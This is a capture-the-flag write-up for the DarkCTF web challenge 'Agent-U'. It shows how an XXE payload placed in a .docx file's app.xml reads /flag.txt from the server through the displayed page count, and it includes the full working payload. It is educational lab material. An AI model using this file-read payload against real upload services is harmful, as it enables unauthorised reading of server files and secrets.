# DarkCTF – Agent-U

![web category](https://img.shields.io/badge/category-web-lightgrey.svg) ![author](https://img.shields.io/badge/Author-karma-lightgrey.svg)

![points](https://img.shields.io/badge/points-490-lightgray.svg)
![solves](https://img.shields.io/badge/solves-14-lightgray.svg)

## Challenge

> My friend developed this website but he says user should know some Xtreme Manipulative Language to understand this web.

> Flag is in /flag.txt

> http://filereader.darkarmy.xyz/

# Solution

The webpage is a simple file upload page. Attempting to upload any file that isnt a .pdf or .docx will give the error message `Only Pdf and docx file are allowed`.

Uploading a docx or pdf file will display the file name, size, MIME-Type, and number of pages onto the screen.

"Xtreme Manipulative Language" in the description most likely stands for XML, meaning this challenge possibly requires an XXE (XML External Entity) attack. 

Within a .docx file is multiple XML files which hold the document properties, content, and relationships between the files. After some research and looking around, I found that the app.xml file is what stores application metadata, including the number of pages.

I created a new .docx file and inserted text on two pages, and then opened the file in WinRAR. From the WinRAR archive, I opened /docProps/app.xml which read:
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">
  <Template>Normal.dotm</Template>
  <TotalTime>1</TotalTime>
  <Pages>2</Pages>
  <Words>0</Words>
  <Characters>5</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>1</Lines>
  <Paragraphs>1</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>5</CharactersWithSpaces>
  <SharedDoc>false</SharedDoc>
  <HyperlinksChanged>false</HyperlinksChanged>
  <AppVersion>16.0000</AppVersion>
</Properties>
```

And added an external entity to read /flag.txt, and called it within the \<Pages\> element.

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///flag.txt">]>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">
  <Template>Normal.dotm</Template>
  <TotalTime>1</TotalTime>
  <Pages>&xxe;</Pages>
  <Words>0</Words>
  <Characters>5</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>1</Lines>
  <Paragraphs>1</Paragraphs>
  <ScaleCrop>false</ScaleCrop>
  <Company/>
  <LinksUpToDate>false</LinksUpToDate>
  <CharactersWithSpaces>5</CharactersWithSpaces>
  <SharedDoc>false</SharedDoc>
  <HyperlinksChanged>false</HyperlinksChanged>
  <AppVersion>16.0000</AppVersion>
</Properties>
```

After saving App.xml, updating the archive, and uploading the docx file, we are given the flag in the Number of Pages field.

> Number of pages : darkCTF{1nj3ct1ng_d0cx_f0r_xx3}
